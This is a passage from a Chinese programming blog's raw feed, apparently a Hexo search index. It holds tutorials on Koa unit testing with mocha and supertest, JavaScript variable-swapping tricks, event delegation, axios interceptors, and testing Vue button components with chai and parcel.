class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = require(<span class="string">&#x27;koa&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">server</span> = async ( ctx, <span class="keyword">next</span> ) =&gt; &#123;</span><br><span class="line">  let result = &#123;</span><br><span class="line">    success: <span class="literal">true</span>,</span><br><span class="line">    data: <span class="literal">null</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ctx.method === <span class="string">&#x27;GET&#x27;</span> ) &#123; </span><br><span class="line">    <span class="keyword">if</span> ( ctx.url === <span class="string">&#x27;/getString.json&#x27;</span> ) &#123;</span><br><span class="line">      result.data = <span class="string">&#x27;this is string data&#x27;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( ctx.url === <span class="string">&#x27;/getNumber.json&#x27;</span> ) &#123;</span><br><span class="line">      result.data = <span class="number">123456</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.success = <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    ctx.body = result</span><br><span class="line">    <span class="keyword">next</span> &amp;&amp; <span class="keyword">next</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( ctx.method === <span class="string">&#x27;POST&#x27;</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ctx.url === <span class="string">&#x27;/postData.json&#x27;</span> ) &#123;</span><br><span class="line">      result.data = <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.success = <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    ctx.body = result</span><br><span class="line">    <span class="keyword">next</span> &amp;&amp; <span class="keyword">next</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ctx.body = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">    <span class="keyword">next</span> &amp;&amp; <span class="keyword">next</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">server</span>)</span><br><span class="line"></span><br><span class="line">module.exports = app</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;[demo] test-unit is starting at port 3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>开始写测试用例</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const supertest = <span class="built_in">require</span>(<span class="string">&#x27;supertest&#x27;</span>)</span><br><span class="line">const chai = <span class="built_in">require</span>(<span class="string">&#x27;chai&#x27;</span>)</span><br><span class="line">const app = <span class="built_in">require</span>(<span class="string">&#x27;./../index&#x27;</span>)</span><br><span class="line"></span><br><span class="line">const expect = chai<span class="selector-class">.expect</span></span><br><span class="line">const request = <span class="built_in">supertest</span>( app<span class="selector-class">.listen</span>() )</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试套件/组</span></span><br><span class="line"><span class="function"><span class="title">describe</span><span class="params">( <span class="string">&#x27;开始测试demo的GET请求&#x27;</span>, ( )</span></span> =&gt; &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 测试用例</span></span><br><span class="line">  <span class="built_in">it</span>(<span class="string">&#x27;测试/getString.json请求&#x27;</span>, ( done ) =&gt; &#123;</span><br><span class="line">      request</span><br><span class="line">        <span class="selector-class">.get</span>(<span class="string">&#x27;/getString.json&#x27;</span>)</span><br><span class="line">        <span class="selector-class">.expect</span>(<span class="number">200</span>)</span><br><span class="line">        <span class="selector-class">.end</span>(( err, res ) =&gt; &#123;</span><br><span class="line">            <span class="comment">// 断言判断结果是否为object类型</span></span><br><span class="line">            <span class="built_in">expect</span>(res.body)<span class="selector-class">.to</span><span class="selector-class">.be</span><span class="selector-class">.an</span>(<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">            <span class="built_in">expect</span>(res<span class="selector-class">.body</span>.success)<span class="selector-class">.to</span><span class="selector-class">.be</span><span class="selector-class">.an</span>(<span class="string">&#x27;boolean&#x27;</span>)</span><br><span class="line">            <span class="built_in">expect</span>(res<span class="selector-class">.body</span>.data)<span class="selector-class">.to</span><span class="selector-class">.be</span><span class="selector-class">.an</span>(<span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">            <span class="built_in">done</span>()</span><br><span class="line">        &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>执行测试用例</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># node.js &lt;= 7.5.x</span></span><br><span class="line">.<span class="regexp">/node_modules/</span>.bin/mocha  --harmony</span><br><span class="line"></span><br><span class="line"><span class="comment"># node.js = 7.6.0</span></span><br><span class="line">.<span class="regexp">/node_modules/</span>.bin/mocha</span><br></pre></td></tr></table></figure><blockquote><p>注意：<br>1.如果是全局安装了mocha，可以直接在当前项目目录下执行 mocha –harmony 命令<br>2.如果当前node.js版本低于7.6，由于7.5.x以下还直接不支持async&#x2F;awiar就需要加上–harmony</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript实现两个变量值交换</title>
      <link href="/Blog/2018/12/27/essay/JavaScript%E5%AE%9E%E7%8E%B0%E4%B8%A4%E4%B8%AA%E5%8F%98%E9%87%8F%E5%80%BC%E4%BA%A4%E6%8D%A2/index/"/>
      <url>/Blog/2018/12/27/essay/JavaScript%E5%AE%9E%E7%8E%B0%E4%B8%A4%E4%B8%AA%E5%8F%98%E9%87%8F%E5%80%BC%E4%BA%A4%E6%8D%A2/index/</url>
      
        <content type="html"><![CDATA[<h5 id="一个经典的问题，“两个变量之间值的交换”。"><a href="#一个经典的问题，“两个变量之间值的交换”。" class="headerlink" title="一个经典的问题，“两个变量之间值的交换”。"></a>一个经典的问题，“两个变量之间值的交换”。</h5><p>1、 引入临时变量进行数据交换</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tmp</span> <span class="operator">=</span> a<span class="comment">;</span></span><br><span class="line"><span class="attribute">a</span> <span class="operator">=</span> b<span class="comment">;</span></span><br><span class="line"><span class="attribute">b</span> <span class="operator">=</span> tmp<span class="comment">; </span></span><br></pre></td></tr></table></figure><p>引入临时变量，最最基本的方法，看着很low，但效率确实很高，经典的才是最优雅的。</p><p>2、 用对象进行数据交换</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">a</span> = &#123;a : b, b : a&#125;<span class="comment">;</span></span><br><span class="line"><span class="attr">b</span> = a.b<span class="comment">;</span></span><br><span class="line"><span class="attr">a</span> = a.a<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>利用对象的键值对进行数据交换</p><p>3、用数组进行数据交换（一）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">a</span> = [a, b]<span class="comment">;</span></span><br><span class="line"><span class="attr">b</span> = a[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line"><span class="attr">a</span> = a[<span class="number">1</span>]<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>利用数组下标进行数据交换</p><p>4、用数组进行数据交换（二）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">a</span> = [b,b=a][<span class="number">0</span>]<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>5、用异或操作进行数据交换（一）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span><span class="regexp"> ^=b</span>;</span><br><span class="line"><span class="attribute">b</span><span class="regexp"> ^=a</span>;</span><br><span class="line"><span class="attribute">a</span><span class="regexp"> ^=b</span>;</span><br></pre></td></tr></table></figure><p>6、用异或操作进行数据交换（二）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span> = (b = (a<span class="regexp"> ^=</span> b)<span class="regexp"> ^</span> b)<span class="regexp"> ^</span> a;</span><br></pre></td></tr></table></figure><p>7、用数字之间的加减运算实现数据交换（仅适用于数字）（一）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">a</span> = a + b<span class="comment">;</span></span><br><span class="line"><span class="attr">b</span> = a - b<span class="comment">; </span></span><br><span class="line"><span class="attr">a</span> = a - b<span class="comment">; </span></span><br></pre></td></tr></table></figure><p>8、用数字之间的加减运算实现数据交换（仅适用于数字）（二）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">a</span> = b -a +(b = a)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>9、用ES6的解构赋值语法实现数据交换</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">[a,b]</span> = <span class="comment">[b,a]</span>;</span><br></pre></td></tr></table></figure><p>扩展：交换数组中的两个元素（用数组的splice() 方法）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span> = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line"><span class="built_in">array</span>[<span class="number">0</span>] = <span class="built_in">array</span>.<span class="built_in">splice</span>(<span class="number">3</span>, <span class="number">1</span>, <span class="built_in">array</span>[<span class="number">0</span>])[<span class="number">0</span>]; <span class="comment">//交换第0个和第3个元素</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>据说80%的前端写出的事件委托都有bug</title>
      <link href="/Blog/2018/12/25/day_thinking/%E6%8D%AE%E8%AF%B480%25%E7%9A%84%E5%89%8D%E7%AB%AF%E5%86%99%E5%87%BA%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A7%94%E6%89%98%E9%83%BD%E6%9C%89bug/index/"/>
      <url>/Blog/2018/12/25/day_thinking/%E6%8D%AE%E8%AF%B480%25%E7%9A%84%E5%89%8D%E7%AB%AF%E5%86%99%E5%87%BA%E7%9A%84%E4%BA%8B%E4%BB%B6%E5%A7%94%E6%89%98%E9%83%BD%E6%9C%89bug/index/</url>
      
        <content type="html"><![CDATA[<h4 id="事件委托是什么？有什么好处？"><a href="#事件委托是什么？有什么好处？" class="headerlink" title="事件委托是什么？有什么好处？"></a>事件委托是什么？有什么好处？</h4><ul><li>假设父元素有一堆儿子，我不监听儿子们，而是监听父亲，看触发事件的是哪个儿子，这就是事件委托。</li><li>还可以监听还没有出生的儿子（动态生成的元素节点），省监听器。<br>事件委托嘛，随手就来一个<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function <span class="built_in">listen</span>(element, eventType, selector, fn) &#123;</span><br><span class="line">  const el = document<span class="selector-class">.querySelector</span>(element)</span><br><span class="line">  el<span class="selector-class">.addEventListener</span>(eventType, e =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (e<span class="selector-class">.target</span><span class="selector-class">.matches</span>(selector)) &#123;</span><br><span class="line">      fn<span class="selector-class">.call</span>(e<span class="selector-class">.target</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>相信大部分写出的代码都是这样子的把，</li></ul><p>本着能用就好，</p><p>应付面试官也够用，</p><p>就这么将就把，</p><p>但是这串代码却是存在 <code>BUG</code> 的。</p><p>再让我们继续来看看一个工资 12k+ 的前端写的时间委托代码</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">listen</span><span class="params">(element, eventType, selector, fn)</span> &#123;</span><br><span class="line">  const f_element = document.querySelector(element)</span><br><span class="line">  f_element.addEventListener(eventType, <span class="keyword">e</span> =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">el</span> = <span class="keyword">e</span>.target</span><br><span class="line">    <span class="keyword">while</span> (!el.matches(selector)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (f_element === <span class="keyword">el</span>) &#123;</span><br><span class="line">        <span class="keyword">el</span> = null</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">el</span> = <span class="keyword">el</span>.parentNode</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">el</span> &amp;&amp; fn.<span class="keyword">call</span>(<span class="keyword">el</span>, <span class="keyword">e</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> f_element</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，拿去轻松愉快撸代码把~</p>]]></content>
      
      
      <categories>
          
          <category> 日常杂疑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>axios拦截器</title>
      <link href="/Blog/2018/12/11/vue/axios%E6%8B%A6%E6%88%AA%E5%99%A8/index/"/>
      <url>/Blog/2018/12/11/vue/axios%E6%8B%A6%E6%88%AA%E5%99%A8/index/</url>
      
        <content type="html"><![CDATA[<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import axios from <span class="string">&#x27;axios&#x27;</span></span><br><span class="line">import &#123; Message &#125; from <span class="string">&#x27;element-ui&#x27;</span></span><br><span class="line">import store from <span class="string">&#x27;@/store&#x27;</span></span><br><span class="line">import Cookies from <span class="string">&#x27;js-cookie&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> create an axios instance</span><br><span class="line">const service = axios.create(&#123;</span><br><span class="line">  baseURL: process.env.BASE_API, <span class="regexp">//</span> api 的 base_url</span><br><span class="line">  timeout: <span class="number">5000</span> <span class="regexp">//</span> request timeout</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> request interceptor</span><br><span class="line">service.interceptors.request.use(</span><br><span class="line">  config =&gt; &#123;</span><br><span class="line">    <span class="regexp">//</span> Do something before request is sent</span><br><span class="line">    <span class="keyword">if</span> (store.getters.unionid) &#123;</span><br><span class="line">      <span class="regexp">//</span> 让每个请求携带unionid-- [<span class="string">&#x27;X-Unionid&#x27;</span>]为自定义key 请根据实际情况自行修改</span><br><span class="line">      Object.assign(config.data, &#123; unionid: Cookies.get(<span class="string">&#x27;unionid&#x27;</span>), communityid: Cookies.get(<span class="string">&#x27;communityid&#x27;</span>), areaid: Cookies.get(<span class="string">&#x27;areaid&#x27;</span>) &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    return config</span><br><span class="line">  &#125;,</span><br><span class="line">  error =&gt; &#123;</span><br><span class="line">    <span class="regexp">//</span> Do something with request error</span><br><span class="line">    console.log(error) <span class="regexp">//</span> <span class="keyword">for</span> debug</span><br><span class="line">    Promise.reject(error)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> response interceptor</span><br><span class="line">service.interceptors.response.use(</span><br><span class="line">  <span class="regexp">//</span> response =&gt; response,</span><br><span class="line">  /**</span><br><span class="line">   * 下面的注释为通过在response里，自定义status来标示请求状态</span><br><span class="line">   * 当status返回如下情况则说明权限有问题，登出并返回到登录页</span><br><span class="line">   * 如想通过 xmlhttprequest 来状态码标识 逻辑可写在下面error中</span><br><span class="line">   * 以下代码均为样例，请结合自生需求加以修改，若不需要，则可删除</span><br><span class="line">   */</span><br><span class="line">  response =&gt; &#123;</span><br><span class="line">    const res = response.data</span><br><span class="line">    console.log(res)</span><br><span class="line">    <span class="keyword">if</span> (res.status !== <span class="number">1</span>) &#123;</span><br><span class="line">      Message(&#123;</span><br><span class="line">        message: res.message,</span><br><span class="line">        type: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">        duration: <span class="number">5</span> * <span class="number">1000</span></span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="regexp">//</span> <span class="regexp">//</span> <span class="number">50008</span>:非法的token; <span class="number">50012</span>:其他客户端登录了;  <span class="number">50014</span>:Token 过期了;</span><br><span class="line">      <span class="regexp">//</span> <span class="keyword">if</span> (res.status === <span class="number">50008</span> || res.status === <span class="number">50012</span> || res.status === <span class="number">50014</span>) &#123;</span><br><span class="line">      <span class="regexp">//</span>   <span class="regexp">//</span> 请自行在引入 MessageBox</span><br><span class="line">      <span class="regexp">//</span>   <span class="regexp">//</span> import &#123; Message, MessageBox &#125; from <span class="string">&#x27;element-ui&#x27;</span></span><br><span class="line">      <span class="regexp">//</span>   MessageBox.confirm(<span class="string">&#x27;你已被登出，可以取消继续留在该页面，或者重新登录&#x27;</span>, <span class="string">&#x27;确定登出&#x27;</span>, &#123;</span><br><span class="line">      <span class="regexp">//</span>     confirmButtonText: <span class="string">&#x27;重新登录&#x27;</span>,</span><br><span class="line">      <span class="regexp">//</span>     cancelButtonText: <span class="string">&#x27;取消&#x27;</span>,</span><br><span class="line">      <span class="regexp">//</span>     type: <span class="string">&#x27;warning&#x27;</span></span><br><span class="line">      <span class="regexp">//</span>   &#125;).then(() =&gt; &#123;</span><br><span class="line">      <span class="regexp">//</span>     store.dispatch(<span class="string">&#x27;FedLogOut&#x27;</span>).then(() =&gt; &#123;</span><br><span class="line">      <span class="regexp">//</span>       location.reload() <span class="regexp">//</span> 为了重新实例化vue-router对象 避免bug</span><br><span class="line">      <span class="regexp">//</span>     &#125;)</span><br><span class="line">      <span class="regexp">//</span>   &#125;)</span><br><span class="line">      <span class="regexp">//</span> &#125;</span><br><span class="line">      return Promise.reject(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      return response.data</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  error =&gt; &#123;</span><br><span class="line">    console.log(<span class="string">&#x27;err&#x27;</span> + error) <span class="regexp">//</span> <span class="keyword">for</span> debug</span><br><span class="line">    Message(&#123;</span><br><span class="line">      message: error.message,</span><br><span class="line">      type: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">      duration: <span class="number">5</span> * <span class="number">1000</span></span><br><span class="line">    &#125;)</span><br><span class="line">    return Promise.reject(error)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">export default service</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import request <span class="keyword">from</span> <span class="string">&#x27;@/utils/request&#x27;</span></span><br><span class="line"></span><br><span class="line">export <span class="function"><span class="keyword">function</span> <span class="title">fetchList</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">request</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;communityWorker/get_worker&#x27;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: data</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export <span class="function"><span class="keyword">function</span> <span class="title">deleteOne</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">request</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;User/del&#x27;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: data</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export <span class="function"><span class="keyword">function</span> <span class="title">fetchOne</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">request</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;User/detail&#x27;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: data</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// export function fetchOne(id) &#123;</span></span><br><span class="line"><span class="comment">//   return request(&#123;</span></span><br><span class="line"><span class="comment">//     url: &#x27;/article/detail&#x27;,</span></span><br><span class="line"><span class="comment">//     method: &#x27;get&#x27;,</span></span><br><span class="line"><span class="comment">//     params: &#123; id &#125;</span></span><br><span class="line"><span class="comment">//   &#125;)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>尝试写第一个单元测试、自动化测试、持续集成</title>
      <link href="/Blog/2018/12/10/vue/%E5%B0%9D%E8%AF%95%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E3%80%81%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/"/>
      <url>/Blog/2018/12/10/vue/%E5%B0%9D%E8%AF%95%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E3%80%81%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/</url>
      
        <content type="html"><![CDATA[<p>测试库：<a href="https://www.chaijs.com/">chai</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 安装</span></span><br><span class="line">npm i -D chai</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> &#123;expect&#125; <span class="keyword">from</span> <span class="string">&#x27;chai&#x27;</span></span><br></pre></td></tr></table></figure><p>打包工具：<a href="https://parceljs.org/getting_started.html">parcel</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 安装</span></span><br><span class="line">npm <span class="selector-tag">i</span> -D parcel</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只需一行代码即可打包，不需要任何配置</span></span><br><span class="line">parcel index<span class="selector-class">.html</span> <span class="attr">--no-cache</span></span><br></pre></td></tr></table></figure><p>测试刚在 <code>vue</code> 写按钮组件</p><p>🌰：一个简单的轮子<br><strong>button.vue</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;$emit(&#x27;click&#x27;)&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">use</span> <span class="attr">:xlink:href</span>=<span class="string">&quot;`#icon-$&#123;icon&#125;`&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">use</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span 